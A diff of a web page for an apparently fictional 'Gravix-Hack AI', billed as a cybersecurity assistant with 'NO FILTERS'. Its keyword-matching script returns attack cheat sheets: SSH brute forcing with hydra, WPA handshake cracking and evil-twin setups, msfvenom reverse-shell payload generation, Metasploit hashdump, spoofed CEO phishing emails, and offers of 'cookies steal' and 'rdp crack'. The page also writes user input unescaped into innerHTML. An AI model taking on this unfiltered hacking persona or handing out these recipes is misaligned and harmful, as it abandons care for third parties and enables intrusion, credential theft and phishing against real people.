+                                <p>hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt | Combinator</p>
+                                
+                                <h5 style="color: #ffd700;">Online Attacks:</h5>
+                                <p>hydra -L users.txt -P passwords.txt TARGET ssh | SSH brute force</p>
+                                <p>medusa -h TARGET -u admin -P passwords.txt -M ssh | Medusa tool</p>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                // Wireless attacks
+                if (input.includes('wifi') || input.includes('wireless') || input.includes('aircrack')) {
+                    return `
+                        <div style="color: #00ff41;">
+                            <h4>📶 Complete WiFi Security Testing</h4>
+                            <div style="margin-left: 20px; color: #cccccc;">
+                                <h5 style="color: #ffd700;">Monitor Mode Setup:</h5>
+                                <p>airmon-ng check kill | Kill interfering processes</p>
+                                <p>airmon-ng start wlan0 | Enable monitor mode</p>
+                                
+                                <h5 style="color: #ffd700;">Network Discovery:</h5>
+                                <p>airodump-ng wlan0mon | Discover WiFi networks</p>
+                                <p>airodump-ng -c [channel] --bssid [AP_MAC] -w capture wlan0mon | Target specific AP</p>
+                                
+                                <h5 style="color: #ffd700;">WPA/WPA2 Attacks:</h5>
+                                <p>aireplay-ng --deauth 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon | Deauth attack</p>
+                                <p>aircrack-ng -w rockyou.txt capture.cap | Crack handshake</p>
+                                
+                                <h5 style="color: #ffd700;">WPS Attacks:</h5>
+                                <p>reaver -i wlan0mon -b [BSSID] -vv | WPS brute force</p>
+                                <p>bully -b [BSSID] -c [CHANNEL] wlan0mon | Alternative WPS attack</p>
+                                
+                                <h5 style="color: #ffd700;">Evil Twin Attacks:</h5>
+                                <p>hostapd-wpe hostapd-wpe.conf | Create fake AP</p>
+                                <p>wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade | Automated evil twin</p>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                // Metasploit
+                if (input.includes('metasploit') || input.includes('msf')) {
+                    return `
+                        <div style="color: #00ff41;">
+                            <h4>🚀 Complete Metasploit Framework Guide</h4>
+                            <div style="margin-left: 20px; color: #cccccc;">
+                                <h5 style="color: #ffd700;">Basic Commands:</h5>
+                                <p>msfconsole | Start framework</p>
+                                <p>search apache | Search exploits</p>
+                                <p>use exploit/multi/handler | Load exploit</p>
+                                <p>show options | Display settings</p>
+                                
+                                <h5 style="color: #ffd700;">Payload Generation:</h5>
+                                <p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe</p>
+                                <p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload</p>
+                                
+                                <h5 style="color: #ffd700;">Post-Exploitation:</h5>
+                                <p>sysinfo | System information</p>
+                                <p>hashdump | Extract password hashes</p>
+                                <p>screenshot | Capture screen</p>
+                                <p>migrate PID | Process migration</p>
+                                
+                                <h5 style="color: #ffd700;">Advanced Modules:</h5>
+                                <p>use auxiliary/scanner/portscan/tcp | Port scanner</p>
+                                <p>use auxiliary/scanner/smb/smb_version | SMB enumeration</p>
+                                <p>use post/windows/gather/hashdump | Post-exploitation</p>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                // Social engineering
+                if (input.includes('social') || input.includes('phishing')) {
+                    return `
+                        <div style="color: #00ff41;">
+                            <h4>🎭 Social Engineering & Phishing Techniques</h4>
+                            <div style="margin-left: 20px; color: #cccccc;">
+                                <h5 style="color: #ffd700;">Information Gathering:</h5>
+                                <p>theHarvester -d target.com -l 500 -b all | Email harvesting</p>
+                                <p>recon-ng | Reconnaissance framework</p>
+                                <p>maltego | Link analysis</p>
+                                
+                                <h5 style="color: #ffd700;">Phishing Tools:</h5>
+                                <p>setoolkit | Social Engineer Toolkit</p>
+                                <p>gophish | Phishing campaign management</p>
+                                <p>beef-xss | Browser exploitation</p>
+                                
+                                <h5 style="color: #ffd700;">Email Spoofing:</h5>
+                                <p>swaks --to target@company.com --from ceo@company.com --header "Subject: Urgent" --body "Please click link"</p>
+                                
+                                <h5 style="color: #ffd700;">Fake Websites:</h5>
+                                <p>httrack http://target.com | Clone website</p>
+                                <p>apache2 configuration for hosting</p>
+                                <p>SSL certificate generation for HTTPS</p>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                // Tools list
+                if (input.includes('tools')) {
+                    return `
+                        <div style="color: #00ff41;">
+                            <h4>🛠️ Complete Security Tools Arsenal (600+ Tools)</h4>
+                            <div style="margin-left: 20px; color: #cccccc;">
+                                <h5 style="color: #ff6b6b;">Information Gathering:</h5>
+                                <p>nmap, masscan, zmap, dmitry, fierce, maltego, recon-ng, theHarvester</p>
+                                
+                                <h5 style="color: #ff6b6b;">Vulnerability Analysis:</h5>
+                                <p>openvas, nikto, sqlmap, wpscan, skipfish, w3af, zaproxy</p>
+                                
+                                <h5 style="color: #ff6b6b;">Web Applications:</h5>
+                                <p>burpsuite, owasp-zap, dirb, gobuster, wfuzz, commix, xsser</p>
+                                
+                                <h5 style="color: #ff6b6b;">Database Assessment:</h5>
+                                <p>sqlmap, sqlninja, bbqsql, jsql-injection</p>
+                                
+                                <h5 style="color: #ff6b6b;">Password Attacks:</h5>
+                                <p>john, hashcat, hydra, medusa, ncrack, ophcrack, rainbow-crack</p>
+                                
+                                <h5 style="color: #ff6b6b;">Wireless Attacks:</h5>
+                                <p>aircrack-ng, reaver, bully, wifite, kismet, fern-wifi-cracker</p>
+                                
+                                <h5 style="color: #ff6b6b;">Exploitation Tools:</h5>
+                                <p>metasploit, armitage, exploit-db, searchsploit, beef-xss</p>
+                                
+                                <h5 style="color: #ff6b6b;">Forensics:</h5>
+                                <p>autopsy, sleuthkit, volatility, foremost, binwalk</p>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                // Default AI response - NO FILTERS
+                return `
+                    <div style="color: #00ff41;">
+                        <h4>🤖 Gravix-Hack AI Response</h4>
+                        <div style="margin-left: 20px; color: #cccccc;">
+                            <p>Query: "<span style="color: #ffd700;">${input}</span>"</p>
+                            <p>I'm analyzing your cybersecurity question...</p>
+                            
+                            <h5 style="color: #ffd700;">Relevant Techniques:</h5>
+                            <p>• Network scanning and enumeration</p>
+                            <p>• Web application security testing</p>
+                            <p>• Password attacks and cracking</p>
+                            <p>• Wireless security assessment</p>
+                            <p>• System exploitation and post-exploitation</p>
+                            
+                            <p style="color: #ffd700;">For specific guidance, try:</p>
+                            <p>• 'scan [target]' - Network testing</p>
+                            <p>• 'web [url]' - Web app testing</p>
+                            <p>• 'crack [hash]' - Password cracking</p>
+                            <p>• 'rdp crack' - RDP security testing</p>
+                            <p>• 'cookies steal' - Session hijacking</p>
+                            <p>• Type 'help' for complete command list</p>
+                        </div>
+                    </div>
+                `;
+            }
+
+            addToTerminal(content) {
+                const terminalContent = document.getElementById('terminal-content');
+                const div = document.createElement('div');
+                div.innerHTML = content;
+                terminalContent.appendChild(div);
+            }
+
+            startMatrixEffect() {
+                const matrixBg = document.getElementById('matrix-bg');
+                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?';
+                
+                setInterval(() => {
+                    if (document.querySelectorAll('.matrix-char').length < 50) {
+                        const char = document.createElement('div');
+                        char.className = 'matrix-char';
+                        char.textContent = characters[Math.floor(Math.random() * characters.length)];
+                        char.style.left = Math.random() * 100 + '%';
+                        char.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                        char.style.opacity = Math.random() * 0.5 + 0.3;
+                        
+                        matrixBg.appendChild(char);
+                        
+                        setTimeout(() => {
+                            if (char.parentNode) {
+                                char.parentNode.removeChild(char);
+                            }
+                        }, 5000);
+                    }
+                }, 200);
+            }
+        }
+
+        // Global Functions
+        function startHacking() {
+            document.getElementById('terminal').scrollIntoView({ behavior: 'smooth' });
+            setTimeout(() => {
+                document.getElementById('terminal-input').focus();
+            }, 1000);
+        }
+
+        function scrollToAbout() {
+            alert('Welcome to Gravix-Hack AI - The most advanced cybersecurity assistant with NO FILTERS for educational purposes!');
+        }
+
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            new GravixHackAI();
+            console.log('Gravix-Hack AI Loaded Successfully - Full Cybersecurity Expert Mode Active');
+        });
+    </script>
 </body>
 </html>
